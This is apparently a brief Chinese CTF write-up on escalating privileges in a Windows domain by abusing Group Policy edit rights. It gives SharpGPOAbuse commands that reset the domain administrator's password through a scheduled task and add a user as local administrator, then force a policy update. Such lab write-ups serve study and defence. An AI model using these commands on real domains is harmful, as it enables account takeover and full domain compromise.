策略组对象特权 提权

2022-10-17 1 min read # ctf # Privilege Escalation

信息收集，得知 SPRAY\hackzzdogs 用户有 策略组修改权限：

操作

// 通过 SharpGPOAbuse 工具 添加 用户即时任务
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author SPARY\administrator --command "cmd.exe" --Arguments "net user administrator qwerty /domain" --GPOName "DCPolicy"


// 通过 SharpGPOAbuse 给 hackzzdogs用户 添加管理员权限
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hackzzdogs --GPOName "DCPolicy" --force

// 执行后要 更新 GPO 策略
gpupdate /force

成功添加管理员权限
